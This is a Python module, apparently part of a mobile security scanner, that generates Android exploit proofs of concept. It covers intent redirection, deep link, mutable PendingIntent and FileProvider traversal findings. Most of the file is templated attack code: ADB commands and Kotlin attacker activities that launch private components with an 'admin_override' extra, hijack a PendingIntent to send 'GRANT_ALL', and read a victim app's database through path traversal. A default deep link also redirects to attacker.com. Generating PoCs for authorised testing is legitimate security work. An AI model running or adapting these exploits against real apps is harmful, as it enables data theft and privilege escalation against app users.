"""Automated Exploit Proof-of-Concept (PoC) Synthesizer.

Generates standalone compilable Android exploit source code (Kotlin/Java)
and executable ADB payload commands for confirmed high-severity mobile vulnerabilities.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Optional

from mobileag.reporting.finding import Finding


@dataclass
class GeneratedPoc:
    finding_id: str
    vulnerability_type: str
    adb_command: str
    kotlin_exploit_code: str
    explanation: str


class ExploitPocSynthesizer:
    """Synthesizes reproducible PoC exploits for confirmed vulnerabilities."""

    def synthesize(self, finding: Finding, target_package: str) -> Optional[GeneratedPoc]:
        """Synthesize PoC based on finding type and parameters."""
        cwe = finding.cwe_id or ""
        fid = finding.id

        if "INTENT_REDIRECTION" in fid or cwe == "CWE-926":
            return self._synthesize_intent_redirection_poc(finding, target_package)
        elif "DEEP_LINK" in fid or "CWE-601" in cwe:
            return self._synthesize_deep_link_poc(finding, target_package)
        elif "PENDING_INTENT" in fid or cwe == "CWE-927":
            return self._synthesize_pending_intent_poc(finding, target_package)
        elif "FILEPROVIDER" in fid or "FILE_PROVIDER" in fid or cwe == "CWE-22":
            return self._synthesize_file_provider_poc(finding, target_package)

        return None

    def _synthesize_intent_redirection_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        target_component = finding.metadata.get("component_name", f"{target_package}.VulnerableActivity")
        adb_cmd = (
            f"adb shell am start -n {target_component} "
            f"--es redirect_intent \"#Intent;action=android.intent.action.VIEW;component={target_package}/.PrivateActivity;end\""
        )

        kotlin_code = f"""// Standalone Exploit PoC for Intent Redirection ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.content.Intent
import android.os.Bundle

class ExploitActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)

        // Craft inner target Intent directing to private unexported component
        val victimTarget = Intent().apply {{
            setClassName("{target_package}", "{target_package}.PrivateActivity")
            putExtra("admin_override", true)
        }}

        // Launch proxy component in victim app embedding our payload
        val attackIntent = Intent().apply {{
            setClassName("{target_package}", "{target_component}")
            putExtra("redirect_intent", victimTarget)
        }}

        startActivity(attackIntent)
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="Intent Redirection",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=(
                f"Launches exported component '{target_component}' with a nested intent extra "
                "forcing the victim app to execute an unexported internal activity."
            ),
        )

    def _synthesize_deep_link_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        uri = finding.metadata.get("uri_scheme", "myapp://vulnerable/action?redirect=https://attacker.com")
        adb_cmd = f"adb shell am start -a android.intent.action.VIEW -d \"{uri}\""

        kotlin_code = f"""// Standalone Exploit PoC for Deep Link Navigation ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle

class DeepLinkExploit : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)

        val uri = Uri.parse("{uri}")
        val attack = Intent(Intent.ACTION_VIEW, uri).apply {{
            setPackage("{target_package}")
        }}
        startActivity(attack)
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="Deep Link Vulnerability",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=f"Triggers deep link URI '{uri}' in victim package '{target_package}'.",
        )

    def _synthesize_pending_intent_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        adb_cmd = f"# PendingIntent mutability requires an attacker app installed on the device"
        kotlin_code = f"""// Standalone Exploit PoC for Mutable PendingIntent Mutability ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.app.PendingIntent
import android.content.Intent
import android.os.Bundle

class MutablePendingIntentExploit : Activity() {{
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {{
        super.onActivityResult(requestCode, resultCode, data)
        val stolenPi = data?.getParcelableExtra<PendingIntent>("pending_intent")
        if (stolenPi != null) {{
            // Mutate underlying intent action/data
            val fillInIntent = Intent().apply {{
                setClassName("{target_package}", "{target_package}.PrivilegedReceiver")
                putExtra("command", "GRANT_ALL")
            }}
            stolenPi.send(this, 0, fillInIntent)
        }}
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="PendingIntent Mutability",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation="Captures mutable PendingIntent and fills in unauthorized extras or actions.",
        )

    def _synthesize_file_provider_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        authority = finding.metadata.get("authority", f"{target_package}.fileprovider")
        adb_cmd = f"adb shell content read --uri content://{authority}/root/data/data/{target_package}/databases/app.db"

        kotlin_code = f"""// Standalone Exploit PoC for FileProvider Traversal ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.net.Uri
import android.os.Bundle
import java.io.BufferedReader
import java.io.InputStreamReader

class FileProviderExploit : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        val uri = Uri.parse("content://{authority}/root/data/data/{target_package}/databases/app.db")
        contentResolver.openInputStream(uri)?.use {{ stream ->
            val content = BufferedReader(InputStreamReader(stream)).readText()
            println("Stolen Database Content: $content")
        }}
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="FileProvider Directory Traversal",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=f"Reads unauthorized sensitive app data via exposed FileProvider authority '{authority}'.",
        )
